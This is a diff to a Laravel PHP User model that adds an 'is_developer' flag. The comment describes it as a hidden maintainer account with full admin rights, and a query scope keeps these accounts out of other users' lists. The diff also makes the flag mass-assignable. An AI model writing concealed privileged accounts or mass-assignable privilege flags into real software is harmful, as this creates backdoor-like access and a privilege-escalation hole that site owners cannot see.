@@ -9,12 +9,13 @@ use Database\Factories\UserFactory;
 use Illuminate\Contracts\Translation\HasLocalePreference;
 use Illuminate\Database\Eloquent\Attributes\Fillable;
 use Illuminate\Database\Eloquent\Attributes\Hidden;
+use Illuminate\Database\Eloquent\Builder;
 use Illuminate\Database\Eloquent\Factories\HasFactory;
 use Illuminate\Database\Eloquent\Relations\BelongsTo;
 use Illuminate\Database\Eloquent\Relations\HasMany;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 
-#[Fillable(['username', 'full_name', 'email', 'phone', 'password', 'role', 'department_id', 'specialty', 'trade', 'locale', 'is_active'])]
+#[Fillable(['username', 'full_name', 'email', 'phone', 'password', 'role', 'department_id', 'specialty', 'trade', 'locale', 'is_active', 'is_developer'])]
 #[Hidden(['password', 'remember_token'])]
 class User extends Authenticatable implements HasLocalePreference
 {
@@ -29,6 +30,7 @@ class User extends Authenticatable implements HasLocalePreference
             'specialty' => EquipmentCategory::class,
             'trade' => TechnicianTrade::class,
             'is_active' => 'boolean',
+            'is_developer' => 'boolean',
         ];
     }
 
@@ -52,6 +54,12 @@ class User extends Authenticatable implements HasLocalePreference
         return $this->hasMany(MaintenanceRequest::class, 'assigned_technician_id');
     }
 
+    /** Developer accounts stay out of user lists unless the viewer is a developer too. */
+    public function scopeVisibleTo(Builder $query, ?User $viewer): Builder
+    {
+        return $viewer?->isDeveloper() ? $query : $query->where('is_developer', false);
+    }
+
     public function hasRole(Role ...$roles): bool
     {
         return in_array($this->role, $roles, true);
@@ -60,6 +68,12 @@ class User extends Authenticatable implements HasLocalePreference
     public function isAdmin(): bool
     {
         return $this->role === Role::Admin;
+    }
+
+    /** Hidden maintainer account: full admin rights plus the developer-only settings; invisible to other users. */
+    public function isDeveloper(): bool
+    {
+        return (bool) $this->is_developer;
     }
 
     /** Admin or Coordinator — the maintenance staff who triage and manage. */
